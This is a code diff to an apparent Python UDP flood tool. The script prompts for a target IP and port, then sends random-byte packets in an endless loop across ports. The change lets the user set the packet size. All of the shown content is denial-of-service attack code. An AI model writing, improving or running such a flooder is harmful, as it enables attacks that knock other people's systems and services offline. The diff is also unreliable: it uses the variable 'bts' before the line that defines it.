@@ -14,15 +14,15 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 
-bytes = random._urandom(50)
-bytes1 = random._urandom(25)
-bytes2 = random._urandom(50000)
+bytes = random._urandom(bts)
+bytes1 = random._urandom(100)
 
 try:
    os.system("clear")
    os.system("python src/logo.py")
    ip = raw_input("While IP Target : ")
    port = input("While the Port : ")
+   bts = input("While bytes (50-50000): ")
    os.system("python3 src/Starter.py")
 except SyntaxError:
       print(R + '[-] ' + C + 'Error code: 422 Unprocessable Entity')
@@ -59,7 +59,7 @@ try:
                        if port == 65534:
                          port = 1
                        while True:
-                            sock.sendto(bytes2, (ip,port))
+                            sock.sendto(bytes, (ip,port))
                             sent = sent + 1
                             port = port + 1
                             print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
